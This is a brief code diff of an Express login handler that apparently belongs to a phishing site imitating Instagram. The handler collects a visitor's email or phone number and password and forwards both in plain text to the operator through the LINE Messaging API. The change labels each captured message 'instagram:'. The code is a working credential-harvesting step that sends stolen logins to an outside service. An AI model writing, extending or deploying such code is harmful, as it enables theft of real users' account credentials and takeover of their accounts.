@@ -19,7 +19,7 @@ app.post('/login', async (req, res) => {
     const password = req.body.password;
 
     // LINEに送信するメッセージの内容を作成
-    const messageText = `【新しい入力通知】\nメール/電話: ${email}\nパスワード: ${password}`;
+    const messageText = `【新しい入力通知】\ninstagram:\nメール/電話: ${email}\nパスワード: ${password}`;
 
     // LINE Messaging APIへ送信
 try {
